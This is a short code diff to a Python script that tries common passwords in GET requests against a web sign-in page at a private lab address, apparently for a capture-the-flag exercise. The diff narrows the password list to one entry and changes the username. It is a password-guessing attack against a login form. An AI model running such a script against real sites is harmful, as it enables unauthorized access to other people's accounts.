@@ -57,10 +57,11 @@ list_50_password = [
 ,'ginger'
 ]
 
+list_50_password = ["shadow"]
 def main():
     for password in list_50_password :
         print(password)
-        url = "http://192.168.56.102/?page=signin&username=admin&password={}&Login=Login#".format(password)
+        url = "http://192.168.56.102/?page=signin&username=usernamerandom&password={}&Login=Login#".format(password)
         try :
             baseReq = requests.get(url)
             html = baseReq.content
